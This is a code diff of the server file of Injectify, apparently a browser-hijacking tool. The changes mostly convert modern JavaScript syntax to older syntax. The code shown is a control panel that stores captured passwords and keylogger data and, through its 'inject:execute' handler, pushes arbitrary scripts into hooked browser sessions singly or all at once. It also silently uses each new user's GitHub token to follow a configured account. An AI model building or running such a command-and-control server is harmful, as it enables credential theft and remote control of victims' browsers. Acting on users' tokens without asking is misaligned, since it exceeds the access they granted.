@@ -1,22 +1,21 @@
 "use strict";
-/* eslint-disable prefer-promise-reject-errors */
-Object.defineProperty(exports, "__esModule", { value: true });
-const MongoClient = require('mongodb').MongoClient;
-const fs = require('fs-extra');
-const chalk = require('chalk');
-const path = require('path');
-const request = require('request');
-const { URL } = require('url');
-const loader_1 = require("./src/api/loader");
-const atob = require('atob');
-const btoa = require('btoa');
-const reverse = require('reverse-string');
-const cookieParser = require('cookie-parser');
-const parseAgent = require('user-agent-parser');
-const me = require('mongo-escape').escape;
-const RateLimit = require('express-rate-limit');
-const getIP = require('./src/modules/getIP.js');
-const pretty = require('express-prettify');
+exports.__esModule = true;
+var MongoClient = require('mongodb').MongoClient;
+var fs = require('fs-extra');
+var chalk = require('chalk');
+var path = require('path');
+var request = require('request');
+var URL = require('url').URL;
+var loader_1 = require("./src/api/loader");
+var atob = require('atob');
+var btoa = require('btoa');
+var reverse = require('reverse-string');
+var cookieParser = require('cookie-parser');
+var parseAgent = require('user-agent-parser');
+var me = require('mongo-escape').escape;
+var RateLimit = require('express-rate-limit');
+var getIP = require('./src/modules/getIP.js');
+var pretty = require('express-prettify');
 /**
  * Read configuration
  */
@@ -25,39 +24,39 @@ if (!fs.existsSync('./server.config.js')) {
         fs.copySync('./server.config.example.js', './server.config.js');
     }
     else {
-        console.error(chalk.redBright(`Failed to start! ${chalk.magentaBright('./server.config.js')} and ${chalk.magentaBright('./server.config.example.js')} are missing`));
+        console.error(chalk.redBright("Failed to start! " + chalk.magentaBright('./server.config.js') + " and " + chalk.magentaBright('./server.config.example.js') + " are missing"));
     }
 }
-const config = require('./server.config.js').injectify;
-const express = require('express');
-const app = express();
-const server = app.listen(config.express);
-const io = require('socket.io').listen(server);
-const apiLimiter = new RateLimit(config.rateLimiting.api);
-const injectLimiter = new RateLimit(config.rateLimiting.inject.auth);
+var config = require('./server.config.js').injectify;
+var express = require('express');
+var app = express();
+var server = app.listen(config.express);
+var io = require('socket.io').listen(server);
+var apiLimiter = new RateLimit(config.rateLimiting.api);
+var injectLimiter = new RateLimit(config.rateLimiting.inject.auth);
 console.log(chalk.greenBright('[Injectify] ') + 'listening on port ' + config.express);
-process.on('unhandledRejection', (reason, p) => {
+process.on('unhandledRejection', function (reason, p) {
     console.log(chalk.redBright('[Promise] ') + ' Unhandled Rejection at:', p, chalk.redBright('\nREASON:'), reason);
 });
-MongoClient.connect(config.mongodb, (err, client) => {
+MongoClient.connect(config.mongodb, function (err, client) {
     if (err)
         throw err;
-    const db = client.db('injectify');
-    const api = new loader_1.default(db);
-    let inject = require('./src/inject/server.js')(server, db);
-    io.on('connection', socket => {
-        let globalToken;
-        let state = {
+    var db = client.db('injectify');
+    var api = new loader_1["default"](db);
+    var inject = global.inject = require('./src/inject/server.js')(server, db);
+    io.on('connection', function (socket) {
+        var globalToken;
+        var state = {
             previous: '',
             page: '',
             refresh: null
         };
-        let watchers = {
+        var watchers = {
             inject: null,
             client: null
         };
-        var getToken = code => {
-            return new Promise((resolve, reject) => {
+        var getToken = function (code) {
+            return new Promise(function (resolve, reject) {
                 if (!code) {
                     reject(Error('Failed to authenticate account, null code'));
                 }
@@ -73,7 +72,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                             'client_secret': config.github.client_secret,
                             'code': code
                         }
-                    }, (error, response, github) => {
+                    }, function (error, response, github) {
                         try {
                             github = JSON.parse(github);
                         }
@@ -92,8 +91,8 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 }
             });
         };
-        var getUser = token => {
-            return new Promise((resolve, reject) => {
+        var getUser = function (token) {
+            return new Promise(function (resolve, reject) {
                 request({
                     url: 'https://api.github.com/user?access_token=' + encodeURIComponent(token),
                     method: 'GET',
@@ -101,7 +100,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                         'Accept': 'application/json',
                         'User-Agent': 'Injectify'
                     }
-                }, (error, response, user) => {
+                }, function (error, response, user) {
                     if (error) {
                         console.error(error);
                         return;
@@ -129,28 +128,28 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 });
             });
         };
-        var database = (user) => {
-            return new Promise((resolve, reject) => {
-                db.collection('users', (err, users) => {
+        var database = function (user) {
+            return new Promise(function (resolve, reject) {
+                db.collection('users', function (err, users) {
                     if (err)
                         throw err;
                     users.findOne({
                         id: user.id
-                    }).then(doc => {
+                    }).then(function (doc) {
                         resolve(doc);
                     });
                 });
             });
         };
-        var login = (user, token, loginMethod) => {
-            return new Promise((resolve, reject) => {
-                db.collection('users', (err, users) => {
+        var login = function (user, token, loginMethod) {
+            return new Promise(function (resolve, reject) {
+                db.collection('users', function (err, users) {
                     if (err)
                         throw err;
                     users.findOne({
                         id: user.id
-                    }).then(doc => {
-                        let ipAddress = getIP(socket.handshake.address);
+                    }).then(function (doc) {
+                        var ipAddress = getIP(socket.handshake.address);
                         if (socket.handshake.headers['x-forwarded-for'])
                             ipAddress = getIP(socket.handshake.headers['x-forwarded-for'].split(',')[0]);
                         if (doc !== null) {
@@ -170,7 +169,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                         login_type: loginMethod
                                     }
                                 }
-                            }).then(() => {
+                            }).then(function () {
                                 resolve();
                             });
                         }
@@ -190,7 +189,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                         token: token,
                                         login_type: loginMethod
                                     }]
-                            }, (err, res) => {
+                            }, function (err, res) {
                                 if (err) {
                                     reject(Error(err));
                                     throw err;
@@ -202,12 +201,12 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                         chalk.cyanBright(' (' + user.login + ')'));
                                     if (config.follow.enable) {
                                         request({
-                                            url: `https://api.github.com/user/following/${config.follow.username}?access_token=${encodeURIComponent(token)}`,
+                                            url: "https://api.github.com/user/following/" + config.follow.username + "?access_token=" + encodeURIComponent(token),
                                             method: 'PUT',
                                             headers: {
                                                 'User-Agent': 'Injectify'
                                             }
-                                        }, (error, response) => {
+                                        }, function (error, response) {
                                             if (error)
                                                 throw error;
                                             resolve();
@@ -220,18 +219,18 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 });
             });
         };
-        var newProject = (project, user) => {
-            return new Promise((resolve, reject) => {
-                database(user).then(dbUser => {
-                    db.collection('projects', (err, projects) => {
+        var newProject = function (project, user) {
+            return new Promise(function (resolve, reject) {
+                database(user).then(function (dbUser) {
+                    db.collection('projects', function (err, projects) {
                         if (err)
                             throw err;
                         projects.find({
                             $or: [{
                                     'permissions.owners': user.id
                                 }]
-                        }).count().then(count => {
-                            let restriction = 3;
+                        }).count().then(function (count) {
+                            var restriction = 3;
                             if (dbUser.payment.account_type.toLowerCase() === 'pro')
                                 restriction = 35;
                             if (dbUser.payment.account_type.toLowerCase() === 'elite')
@@ -248,7 +247,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                             }
                             projects.findOne({
                                 name: project
-                            }).then(doc => {
+                            }).then(function (doc) {
                                 if (doc == null) {
                                     // Project doesn't exist in database
                                     projects.insertOne({
@@ -270,7 +269,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                         },
                                         passwords: [],
                                         keylogger: []
-                                    }, (err, res) => {
+                                    }, function (err, res) {
                                         if (err) {
                                             throw err;
                                         }
@@ -299,7 +298,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                     });
                                 }
                             });
-                        }).catch(error => {
+                        })["catch"](function (error) {
                             reject({
                                 title: 'Database error',
                                 message: 'An internal error occured whilst handling your request'
@@ -307,7 +306,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                             throw error;
                         });
                     });
-                }).catch(error => {
+                })["catch"](function (error) {
                     reject({
                         title: 'Database error',
                         message: 'An internal error occured whilst handling your request'
@@ -316,12 +315,12 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 });
             });
         };
-        var getProjects = user => {
-            return new Promise((resolve, reject) => {
-                db.collection('projects', (err, projects) => {
+        var getProjects = function (user) {
+            return new Promise(function (resolve, reject) {
+                db.collection('projects', function (err, projects) {
                     if (err)
                         throw err;
-                    let projectsWithAccess = [];
+                    var projectsWithAccess = [];
                     projects.find({
                         $or: [{
                                 'permissions.owners': user.id
@@ -335,14 +334,14 @@ MongoClient.connect(config.mongodb, (err, client) => {
                         ]
                     }).sort({
                         name: 1
-                    }).forEach(doc => {
+                    }).forEach(function (doc) {
                         if (doc !== null) {
                             projectsWithAccess.push({
                                 name: doc.name,
                                 permissions: doc.permissions
                             });
                         }
-                    }, error => {
+                    }, function (error) {
                         if (error)
                             throw error;
                         if (projectsWithAccess.length > 0) {
@@ -355,9 +354,9 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 });
             });
         };
-        var getProject = (name, user) => {
-            return new Promise((resolve, reject) => {
-                db.collection('projects', (err, projects) => {
+        var getProject = function (name, user) {
+            return new Promise(function (resolve, reject) {
+                db.collection('projects', function (err, projects) {
                     if (err)
                         throw err;
                     projects.findOne({
@@ -374,9 +373,9 @@ MongoClient.connect(config.mongodb, (err, client) => {
                         $and: [{
                                 'name': name
                             }]
-                    }).then(doc => {
+                    }).then(function (doc) {
                         if (doc !== null) {
-                            let myPermissionLevel = 3;
+                            var myPermissionLevel = 3;
                             if (doc.permissions.owners.includes(user.id)) {
                                 myPermissionLevel = 1;
                             }
@@ -398,15 +397,15 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 });
             });
         };
-        var unwatch = type => {
+        var unwatch = function (type) {
             if (type === 'client' && watchers.client && inject.clients[watchers.client.id][watchers.client.token] && inject.clients[watchers.client.id][watchers.client.token].watchers)
-                inject.clients[watchers.client.id][watchers.client.token].watchers.forEach((watcher, i) => {
+                inject.clients[watchers.client.id][watchers.client.token].watchers.forEach(function (watcher, i) {
                     if (watcher.socket === socket.id) {
                         inject.clients[watchers.client.id][watchers.client.token].watchers.splice(i, 1);
                     }
                 });
             if (type === 'inject' && watchers.inject)
-                inject.watchers[watchers.inject] = inject.watchers[watchers.inject].filter(watcher => {
+                inject.watchers[watchers.inject] = inject.watchers[watchers.inject].filter(function (watcher) {
                     return watcher.id !== socket.id;
                 });
         };
@@ -420,17 +419,17 @@ MongoClient.connect(config.mongodb, (err, client) => {
             },
             discord: config.discord && config.discord.widgetbot
         });
-        socket.on('auth:github', data => {
+        socket.on('auth:github', function (data) {
             if (data.code) {
                 // Convert the code into a user-token
-                getToken(data.code).then(token => {
+                getToken(data.code).then(function (token) {
                     if (config.debug) {
                         console.log(chalk.greenBright('[GitHub] ') +
                             chalk.yellowBright('retrieved token ') +
                             chalk.magentaBright(token));
                     }
                     // Convert the token into a user object
-                    getUser(token).then(user => {
+                    getUser(token).then(function (user) {
                         globalToken = token;
                         socket.emit('auth:github', {
                             success: true,
@@ -444,28 +443,28 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                 chalk.cyanBright(' (' + user.login + ')'));
                         }
                         // Add the user to the database if they don't exist
-                        login(user, token, 'manual').then(() => {
-                            getProjects(user).then(projects => {
+                        login(user, token, 'manual').then(function () {
+                            getProjects(user).then(function (projects) {
                                 socket.emit('user:projects', projects);
-                            }).catch(error => {
+                            })["catch"](function (error) {
                                 if (config.debug)
                                     console.log(chalk.redBright('[database] '), error);
                             });
-                        }).catch(error => {
+                        })["catch"](function (error) {
                             console.log(chalk.redBright('[database] '), error);
                             socket.emit('database:registration', {
                                 success: false,
                                 message: error
                             });
                         });
-                    }).catch(error => {
+                    })["catch"](function (error) {
                         console.log(chalk.redBright('[auth:github] '), error.message);
                         socket.emit('err', {
                             title: error.title,
                             message: error.message
                         });
                     });
-                }).catch(error => {
+                })["catch"](function (error) {
                     console.log(chalk.redBright('[auth:github] '), error.message);
                     socket.emit('err', {
                         title: error.title,
@@ -474,19 +473,19 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 });
             }
         });
-        socket.on('auth:signout', data => {
+        socket.on('auth:signout', function (data) {
             globalToken = '';
             state = {};
             if (watchers.inject) {
-                inject.watchers[watchers.inject] = inject.watchers[watchers.inject].filter(watcher => {
+                inject.watchers[watchers.inject] = inject.watchers[watchers.inject].filter(function (watcher) {
                     return watcher.id !== socket.id;
                 });
             }
         });
-        socket.on('auth:github/token', token => {
+        socket.on('auth:github/token', function (token) {
             if (token) {
                 // Convert the token into a user object
-                getUser(token).then(user => {
+                getUser(token).then(function (user) {
                     globalToken = token;
                     socket.emit('auth:github', {
                         success: true,
@@ -500,21 +499,21 @@ MongoClient.connect(config.mongodb, (err, client) => {
                             chalk.cyanBright(' (' + user.login + ')'));
                     }
                     // Add the user to the database if they don't exist
-                    login(user, token, 'automatic').then(() => {
-                        getProjects(user).then(projects => {
+                    login(user, token, 'automatic').then(function () {
+                        getProjects(user).then(function (projects) {
                             socket.emit('user:projects', projects);
-                        }).catch(error => {
+                        })["catch"](function (error) {
                             if (config.debug)
                                 console.log(chalk.redBright('[database] '), error);
                         });
-                    }).catch(error => {
+                    })["catch"](function (error) {
                         console.log(chalk.redBright('[database] '), error);
                         socket.emit('database:registration', {
                             success: false,
                             message: error.toString()
                         });
                     });
-                }).catch(error => {
+                })["catch"](function (error) {
                     // Signal the user to re-authenticate their GitHub account
                     console.log(chalk.redBright('[auth:github/token] '), error.message);
                     socket.emit('auth:github/stale', {
@@ -524,16 +523,16 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 });
             }
         });
-        socket.on('github:star', action => {
+        socket.on('github:star', function (action) {
             if (globalToken) {
                 if (action === 'star' || action === 'unstar') {
                     request({
-                        url: `https://api.github.com/user/starred/samdenty99/injectify?access_token=${encodeURIComponent(globalToken)}`,
+                        url: "https://api.github.com/user/starred/samdenty99/injectify?access_token=" + encodeURIComponent(globalToken),
                         method: action === 'star' ? 'PUT' : 'DELETE',
                         headers: {
                             'User-Agent': 'Injectify'
                         }
-                    }, (error, response) => {
+                    }, function (error, response) {
                         if (error)
                             throw error;
                     });
@@ -546,7 +545,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 });
             }
         });
-        socket.on('project:create', project => {
+        socket.on('project:create', function (project) {
             if (project.name && globalToken) {
                 if (project.name.length > 50) {
                     socket.emit('err', {
@@ -555,27 +554,27 @@ MongoClient.connect(config.mongodb, (err, client) => {
                     });
                     return;
                 }
-                getUser(globalToken).then(user => {
-                    newProject(project.name, user).then(data => {
+                getUser(globalToken).then(function (user) {
+                    newProject(project.name, user).then(function (data) {
                         socket.emit('notify', {
                             title: data.title,
                             message: data.message,
                             id: data.id
                         });
-                        getProjects(user).then(projects => {
+                        getProjects(user).then(function (projects) {
                             socket.emit('user:projects', projects);
-                        }).catch(error => {
+                        })["catch"](function (error) {
                             if (config.debug)
                                 console.log(chalk.redBright('[database] '), error);
                         });
-                    }).catch(e => {
+                    })["catch"](function (e) {
                         socket.emit('err', {
                             title: e.title,
                             message: e.message,
                             id: e.id
                         });
                     });
-                }).catch(error => {
+                })["catch"](function (error) {
                     // Failed to authenticate user with token
                     console.log(chalk.redBright('[project:create] '), error.message);
                     socket.emit('err', {
@@ -592,19 +591,19 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 });
             }
         });
-        socket.on('project:read', data => {
-            let { project, page } = data;
-            let pages = ['overview', 'passwords', 'keylogger', 'inject', 'config'];
+        socket.on('project:read', function (data) {
+            var project = data.project, page = data.page;
+            var pages = ['overview', 'passwords', 'keylogger', 'inject', 'config'];
             if (globalToken) {
                 if (project && page && pages.includes(page)) {
                     state.page = page;
                     state.project = project;
                     clearTimeout(state.refresh);
-                    getUser(globalToken).then(user => {
+                    getUser(globalToken).then(function (user) {
                         /**
                          * Fetch the user from the database
                          */
-                        database(user).then(dbUser => {
+                        database(user).then(function (dbUser) {
                             (function check() {
                                 /**
                                  * Make sure they are still on the same page and same project
@@ -614,18 +613,19 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                 /**
                                  * Fetch the project from the database
                                  */
-                                getProject(project, user).then(doc => {
+                                getProject(project, user).then(function (doc) {
                                     doc = doc.doc;
                                     /**
                                      * Iterates over the pages array and removes elements
                                      * from the doc that don't match the requested page
                                      */
-                                    for (let p of pages) {
+                                    for (var _i = 0, pages_1 = pages; _i < pages_1.length; _i++) {
+                                        var p = pages_1[_i];
                                         if (p !== page) {
                                             delete doc[p];
                                         }
                                     }
-                                    let currentState = JSON.stringify(doc);
+                                    var currentState = JSON.stringify(doc);
                                     if (state.previous !== currentState) {
                                         state.previous = currentState;
                                         socket.emit('project:read', {
@@ -637,7 +637,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                      * Check
                                      */
                                     state.refresh = setTimeout(check, 1000);
-                                }).catch(e => {
+                                })["catch"](function (e) {
                                     // User doesn't have permission access the project
                                     socket.emit('err', {
                                         title: e.title,
@@ -646,7 +646,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                 });
                             })();
                         });
-                    }).catch(error => {
+                    })["catch"](function (error) {
                         // Failed to authenticate user with token
                         console.log(chalk.redBright('[project:read] '), error.message);
                         socket.emit('err', {
@@ -669,11 +669,11 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 });
             }
         });
-        socket.on('project:modify', data => {
-            let command = data.command;
-            let project = data.project;
-            var convertToID = (type, value) => {
-                return new Promise((resolve, reject) => {
+        socket.on('project:modify', function (data) {
+            var command = data.command;
+            var project = data.project;
+            var convertToID = function (type, value) {
+                return new Promise(function (resolve, reject) {
                     if (type === 'id') {
                         request({
                             url: 'https://api.github.com/user/' + encodeURIComponent(value) + '?client_id=' + config.github.client_id + '&client_secret=' + config.github.client_secret,
@@ -682,7 +682,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                 'Accept': 'application/json',
                                 'User-Agent': 'Injectify'
                             }
-                        }, (error, response, user) => {
+                        }, function (error, response, user) {
                             try {
                                 user = JSON.parse(user);
                             }
@@ -714,7 +714,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                 'Accept': 'application/json',
                                 'User-Agent': 'Injectify'
                             }
-                        }, (error, response, user) => {
+                        }, function (error, response, user) {
                             try {
                                 user = JSON.parse(user);
                             }
@@ -740,8 +740,8 @@ MongoClient.connect(config.mongodb, (err, client) => {
                     }
                 });
             };
-            var addToProject = (requestingUser, targetUser, choosenPermissionLevel, targetProject) => {
-                return new Promise((resolve, reject) => {
+            var addToProject = function (requestingUser, targetUser, choosenPermissionLevel, targetProject) {
+                return new Promise(function (resolve, reject) {
                     if (targetProject.doc.permissions.owners.includes(targetUser) || targetProject.doc.permissions.admins.includes(targetUser) || targetProject.doc.permissions.readonly.includes(targetUser)) {
                         reject({
                             title: 'User already exists',
@@ -783,16 +783,17 @@ MongoClient.connect(config.mongodb, (err, client) => {
                             });
                             return;
                         }
-                        db.collection('projects', (err, projects) => {
+                        db.collection('projects', function (err, projects) {
                             if (err)
                                 throw err;
                             projects.updateOne({
                                 name: targetProject.doc.name
                             }, {
-                                $push: {
-                                    ['permissions.' + choosenPermissionLevel]: targetUser
-                                }
+                                $push: (_a = {},
+                                    _a['permissions.' + choosenPermissionLevel] = targetUser,
+                                    _a)
                             });
+                            var _a;
                         });
                         resolve({
                             title: 'Added user to project',
@@ -801,9 +802,9 @@ MongoClient.connect(config.mongodb, (err, client) => {
                     }
                 });
             };
-            var removeFromProject = (requestingUser, targetUser, targetProject) => {
-                return new Promise((resolve, reject) => {
-                    let theirPermissionLevel, theirPermissionName;
+            var removeFromProject = function (requestingUser, targetUser, targetProject) {
+                return new Promise(function (resolve, reject) {
+                    var theirPermissionLevel, theirPermissionName;
                     if (targetProject.doc.permissions.owners.includes(targetUser)) {
                         theirPermissionLevel = 1;
                         theirPermissionName = 'permissions.owners';
@@ -817,16 +818,17 @@ MongoClient.connect(config.mongodb, (err, client) => {
                         theirPermissionName = 'permissions.readonly';
                     }
                     if (targetProject.myPermissionLevel !== 3 && targetProject.myPermissionLevel <= theirPermissionLevel) {
-                        db.collection('projects', (err, projects) => {
+                        db.collection('projects', function (err, projects) {
                             if (err)
                                 throw err;
                             projects.updateOne({
                                 name: targetProject.doc.name
                             }, {
-                                $pull: {
-                                    [theirPermissionName]: targetUser
-                                }
+                                $pull: (_a = {},
+                                    _a[theirPermissionName] = targetUser,
+                                    _a)
                             });
+                            var _a;
                         });
                         resolve({
                             title: 'Removed user',
@@ -841,15 +843,15 @@ MongoClient.connect(config.mongodb, (err, client) => {
                     }
                 });
             };
-            var renameProject = (requestingUser, targetProject, newName) => {
-                return new Promise((resolve, reject) => {
+            var renameProject = function (requestingUser, targetProject, newName) {
+                return new Promise(function (resolve, reject) {
                     if (targetProject.doc.permissions.owners.includes(requestingUser.id)) {
-                        db.collection('projects', (err, projects) => {
+                        db.collection('projects', function (err, projects) {
                             if (err)
                                 throw err;
                             projects.findOne({
                                 name: newName
-                            }).then(doc => {
+                            }).then(function (doc) {
                                 if (doc == null) {
                                     projects.updateOne({
                                         name: targetProject.doc.name
@@ -880,15 +882,15 @@ MongoClient.connect(config.mongodb, (err, client) => {
                     }
                 });
             };
-            var updateFilters = (requestingUser, targetProject, newFilters) => {
-                return new Promise((resolve, reject) => {
+            var updateFilters = function (requestingUser, targetProject, newFilters) {
+                return new Promise(function (resolve, reject) {
                     if (targetProject.doc.permissions.owners.includes(requestingUser.id) || targetProject.doc.permissions.admins.includes(requestingUser.id)) {
-                        db.collection('projects', (err, projects) => {
+                        db.collection('projects', function (err, projects) {
                             if (err)
                                 throw err;
                             projects.findOne({
                                 name: targetProject.doc.name
-                            }).then(doc => {
+                            }).then(function (doc) {
                                 if (doc !== null) {
                                     projects.updateOne({
                                         name: targetProject.doc.name
@@ -920,12 +922,12 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 });
             };
             if (command && project) {
-                getUser(globalToken).then(user => {
-                    getProject(project, user).then(thisProject => {
+                getUser(globalToken).then(function (user) {
+                    getProject(project, user).then(function (thisProject) {
                         if (command === 'permissions:add') {
                             if (data.project && data.method && data.type && data.value) {
-                                convertToID(data.method, data.value).then(targetUser => {
-                                    addToProject(user, targetUser.id, data.type, thisProject).then(r => {
+                                convertToID(data.method, data.value).then(function (targetUser) {
+                                    addToProject(user, targetUser.id, data.type, thisProject).then(function (r) {
                                         socket.emit('notify', {
                                             title: r.title,
                                             message: r.message
@@ -938,13 +940,13 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                             chalk.cyanBright(' (' + targetUser.login + ') ') +
                                             chalk.yellowBright(' to project ') +
                                             chalk.magentaBright(thisProject.doc.name));
-                                    }).catch(e => {
+                                    })["catch"](function (e) {
                                         socket.emit('err', {
                                             title: e.title,
                                             message: e.message
                                         });
                                     });
-                                }).catch(e => {
+                                })["catch"](function (e) {
                                     socket.emit('err', {
                                         title: e.title,
                                         message: e.message
@@ -960,7 +962,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                         }
                         if (command === 'permissions:remove') {
                             if (data.user) {
-                                removeFromProject(user, data.user, thisProject).then(response => {
+                                removeFromProject(user, data.user, thisProject).then(function (response) {
                                     socket.emit('notify', response);
                                     console.log(chalk.greenBright('[database] ') +
                                         chalk.magentaBright(user.id) +
@@ -969,7 +971,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                         chalk.magentaBright(data.user) +
                                         chalk.yellowBright(' from project ') +
                                         chalk.magentaBright(thisProject.doc.name));
-                                }).catch(e => {
+                                })["catch"](function (e) {
                                     socket.emit('err', {
                                         title: e.title,
                                         message: e.message
@@ -994,17 +996,17 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                 }
                                 if (data.newName === thisProject.doc.name)
                                     return;
-                                renameProject(user, thisProject, data.newName).then(response => {
+                                renameProject(user, thisProject, data.newName).then(function (response) {
                                     state.project = '';
                                     state.page = '';
                                     clearTimeout(state.refresh);
                                     socket.emit('project:switch', {
                                         project: data.newName
                                     });
-                                    setTimeout(() => {
-                                        getProjects(user).then(projects => {
+                                    setTimeout(function () {
+                                        getProjects(user).then(function (projects) {
                                             socket.emit('user:projects', projects);
-                                        }).catch(error => {
+                                        })["catch"](function (error) {
                                             if (config.debug)
                                                 console.log(chalk.redBright('[database] '), error);
                                         });
@@ -1017,7 +1019,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                         chalk.magentaBright(thisProject.doc.name) +
                                         chalk.yellowBright(' to ') +
                                         chalk.magentaBright(data.newName));
-                                }).catch(e => {
+                                })["catch"](function (e) {
                                     socket.emit('err', {
                                         title: e.title,
                                         message: e.message
@@ -1033,12 +1035,12 @@ MongoClient.connect(config.mongodb, (err, client) => {
                         }
                         if (command === 'filters:modify') {
                             if (data.project && data.filter) {
-                                updateFilters(user, thisProject, data.filter).then((response) => {
+                                updateFilters(user, thisProject, data.filter).then(function (response) {
                                     socket.emit('notify', {
                                         title: response.title,
                                         message: response.message
                                     });
-                                }).catch(e => {
+                                })["catch"](function (e) {
                                     socket.emit('err', {
                                         title: e.title,
                                         message: e.message
@@ -1052,13 +1054,13 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                 });
                             }
                         }
-                    }).catch(e => {
+                    })["catch"](function (e) {
                         socket.emit('err', {
                             title: e.title,
                             message: e.message
                         });
                     });
-                }).catch(e => {
+                })["catch"](function (e) {
                     socket.emit('err', {
                         title: e.title,
                         message: e.message
@@ -1066,13 +1068,13 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 });
             }
         });
-        socket.on('inject:clients', data => {
-            let { project } = data;
+        socket.on('inject:clients', function (data) {
+            var project = data.project;
             if (project && globalToken) {
-                getUser(globalToken).then(user => {
-                    getProject(project, user).then(thisProject => {
+                getUser(globalToken).then(function (user) {
+                    getProject(project, user).then(function (thisProject) {
                         if (watchers.inject) {
-                            inject.watchers[watchers.inject] = inject.watchers[watchers.inject].filter(watcher => {
+                            inject.watchers[watchers.inject] = inject.watchers[watchers.inject].filter(function (watcher) {
                                 return watcher.id !== socket.id;
                             });
                         }
@@ -1081,7 +1083,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                             inject.watchers[watchers.inject] = [];
                         inject.watchers[watchers.inject].push({
                             id: socket.id,
-                            callback: (event, session) => {
+                            callback: function (event, session) {
                                 socket.emit('inject:clients', {
                                     event: event,
                                     session: session,
@@ -1094,14 +1096,14 @@ MongoClient.connect(config.mongodb, (err, client) => {
                             clients: inject.clients[thisProject.doc['_id']],
                             project: project
                         });
-                    }).catch(e => {
+                    })["catch"](function (e) {
                         console.log(e);
                         socket.emit('err', {
                             title: e.title,
                             message: e.message
                         });
                     });
-                }).catch(error => {
+                })["catch"](function (error) {
                     // Failed to authenticate user with token
                     console.log(chalk.redBright('[inject:clients] '), error.message);
                     socket.emit('err', {
@@ -1117,23 +1119,23 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 });
             }
         });
-        socket.on('inject:client', data => {
-            let { project, client } = data;
+        socket.on('inject:client', function (data) {
+            var project = data.project, client = data.client;
             if (typeof project === 'string' && typeof client === 'string' && globalToken) {
-                getUser(globalToken).then(user => {
-                    getProject(project, user).then(thisProject => {
-                        let clients = inject.clients[thisProject.doc['_id']];
+                getUser(globalToken).then(function (user) {
+                    getProject(project, user).then(function (thisProject) {
+                        var clients = inject.clients[thisProject.doc['_id']];
                         /**
                          * Remove previous watchers
                          */
                         unwatch('client');
                         if (clients && clients[client]) {
-                            let watchingClient = clients[client];
+                            var watchingClient = clients[client];
                             if (!watchingClient.watchers)
                                 watchingClient.watchers = [];
                             watchingClient.watchers.push({
                                 socket: socket.id,
-                                emit: client => {
+                                emit: function (client) {
                                     socket.emit('inject:client', client);
                                 }
                             });
@@ -1146,14 +1148,14 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                 token: client
                             };
                         }
-                    }).catch(e => {
+                    })["catch"](function (e) {
                         console.log(e);
                         socket.emit('err', {
                             title: e.title,
                             message: e.message
                         });
                     });
-                }).catch(error => {
+                })["catch"](function (error) {
                     // Failed to authenticate user with token
                     console.log(chalk.redBright('[inject:client] '), error.message);
                     socket.emit('err', {
@@ -1169,15 +1171,15 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 });
             }
         });
-        socket.on('inject:execute', data => {
-            let { project, token, id, script, recursive } = data;
+        socket.on('inject:execute', function (data) {
+            var project = data.project, token = data.token, id = data.id, script = data.script, recursive = data.recursive;
             if (project && (recursive || (typeof token === 'string' && typeof id === 'number')) && typeof script === 'string' && globalToken) {
-                getUser(globalToken).then(user => {
-                    getProject(project, user).then(thisProject => {
+                getUser(globalToken).then(function (user) {
+                    getProject(project, user).then(function (thisProject) {
                         if (recursive) {
-                            Object.keys(inject.clients[thisProject.doc['_id']]).forEach(token => {
+                            Object.keys(inject.clients[thisProject.doc['_id']]).forEach(function (token) {
                                 if (inject.clients[thisProject.doc['_id']][token] && inject.clients[thisProject.doc['_id']][token].sessions) {
-                                    inject.clients[thisProject.doc['_id']][token].sessions.forEach(client => {
+                                    inject.clients[thisProject.doc['_id']][token].sessions.forEach(function (client) {
                                         client.execute(script);
                                     });
                                 }
@@ -1185,9 +1187,9 @@ MongoClient.connect(config.mongodb, (err, client) => {
                         }
                         else {
                             if (inject.clients[thisProject.doc['_id']] && inject.clients[thisProject.doc['_id']][token] && inject.clients[thisProject.doc['_id']][token].sessions) {
-                                let client = inject.clients[thisProject.doc['_id']][token].sessions.find(c => c.id === id);
-                                if (client) {
-                                    client.execute(script);
+                                var client_1 = inject.clients[thisProject.doc['_id']][token].sessions.find(function (c) { return c.id === id; });
+                                if (client_1) {
+                                    client_1.execute(script);
                                 }
                                 else {
                                     socket.emit('err', {
@@ -1203,14 +1205,14 @@ MongoClient.connect(config.mongodb, (err, client) => {
                                 });
                             }
                         }
-                    }).catch(e => {
+                    })["catch"](function (e) {
                         console.log(e);
                         socket.emit('err', {
                             title: e.title,
                             message: e.message
                         });
                     });
-                }).catch(error => {
+                })["catch"](function (error) {
                     // Failed to authenticate user with token
                     console.log(chalk.redBright('[inject:execute] '), error.message);
